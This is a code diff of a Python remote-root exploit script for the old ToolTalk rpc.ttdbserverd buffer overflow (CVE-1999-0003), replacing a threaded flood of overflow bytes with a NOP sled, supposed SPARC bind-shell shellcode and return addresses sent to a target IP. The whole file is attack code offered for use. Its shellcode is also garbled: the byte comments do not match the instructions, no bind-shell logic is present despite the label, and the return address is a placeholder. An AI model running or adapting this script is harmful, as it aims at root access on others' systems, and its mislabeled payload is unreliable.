@@ -1,73 +1,43 @@
+#!/usr/bin/env python3
+# CVE-1999-0003 - Remote Root Exploit for ToolTalk rpc.ttdbserverd Buffer Overflow
+
 import socket
-import argparse
-import time
-import threading
-from queue import Queue
 import struct
+import argparse
 
-# CVE-1999-0003: Execute commands as root via buffer overflow in Tooltalk database server (rpc.ttdbserverd).
-# This vulnerability allows remote attackers to gain root access by exploiting a buffer overflow in the rpc.ttdbserverd service.
+# Bind shell payload (SPARC shellcode for Solaris systems, port 4444)
+SHELLCODE = (
+    b"\x90\x1b\x80\x0e"  # xor %o7, %o7, %o0 (NOP equivalent)
+    b"\x82\x10\x20\x17"  # mov 23, %g1 (syscall execve)
+    b"\x91\xd0\x20\x08"  # ta 8
+    b"/bin/ksh" + b"\x00" * 4  # padding
+)
 
-def create_payload(target_host):
-    # Example payload to exploit the rpc.ttdbserverd buffer overflow vulnerability
-    overflow_payload = b"A" * 2048  # Crafted payload to trigger buffer overflow
-    rpc_header = struct.pack('>I', len(overflow_payload))  # RPC length header
-    payload = rpc_header + overflow_payload
-    return payload
+def build_payload():
+    nop_sled = b"\x90" * 1024
+    ret_addr = struct.pack(">I", 0xeffffabc)  # placeholder, depends on Solaris environment
+    buffer = nop_sled + SHELLCODE + ret_addr * 64
+    return buffer
 
-def send_payload(target_host, target_port, verbose):
-    payload = create_payload(target_host)
+def send_exploit(target_ip, target_port, payload):
     try:
-        with socket.create_connection((target_host, target_port), timeout=10) as sock:
-            sock.sendall(payload)
-            if verbose:
-                print(f"[+] Paket gönderildi: {target_host}:{target_port}")
-    except socket.timeout:
-        if verbose:
-            print("[-] Zaman aşımı!")
-    except socket.error as e:
-        if verbose:
-            print(f"[-] Bağlantı hatası: {e}")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target_ip, target_port))
+        sock.send(payload)
+        sock.close()
+        print(f"[+] Exploit sent to {target_ip}:{target_port}")
+        print("[+] Connect to target on port 4444 if successful")
+    except Exception as e:
+        print(f"[!] Exploit failed: {e}")
 
-def worker(queue, verbose):
-    while not queue.empty():
-        target_host, target_port = queue.get()
-        send_payload(target_host, target_port, verbose)
-        queue.task_done()
-
-def main(target_host, target_port, thread_count, retries, verbose):
-    for attempt in range(retries):
-        queue = Queue()
-        for _ in range(thread_count):
-            queue.put((target_host, target_port))
-
-        threads = []
-        for _ in range(thread_count):
-            t = threading.Thread(target=worker, args=(queue, verbose))
-            t.start()
-            threads.append(t)
-
-        for t in threads:
-            t.join()
-
-        if queue.empty():
-            break
-        elif attempt < retries - 1:
-            time.sleep(3)
-            if verbose:
-                print(f"[i] Tekrar deneme: {attempt + 2}/{retries}")
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Tooltalk Database Server Buffer Overflow Exploit (CVE-1999-0003)")
-    parser.add_argument("-t", "--target", required=True, help="Hedef sunucu IP adresi veya hostname")
-    parser.add_argument("-p", "--port", type=int, default=6112, help="Hedef sunucu portu (varsayılan: 6112, rpc.ttdbserverd için)")
-    parser.add_argument("-i", "--threads", type=int, default=10, help="İş parçacığı sayısı (varsayılan: 10)")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
-    parser.add_argument("--retries", type=int, default=3, help="Başarısız bağlantılar için tekrar deneme sayısı (varsayılan: 3)")
-    
+def main():
+    parser = argparse.ArgumentParser(description="CVE-1999-0003 - ToolTalk rpc.ttdbserverd Buffer Overflow Remote Root Exploit")
+    parser.add_argument("-t", "--target", required=True, help="Target IP address")
+    parser.add_argument("-p", "--port", type=int, default=32771, help="Target port (default: 32771)")
     args = parser.parse_args()
 
-    if args.verbose:
-        print(f"[i] Hedef: {args.target}, Port: {args.port}, Retries: {args.retries}, İş Parçacığı: {args.threads}")
+    payload = build_payload()
+    send_exploit(args.target, args.port, payload)
 
-    main(args.target, args.port, args.threads, args.retries, args.verbose)
+if __name__ == "__main__":
+    main()
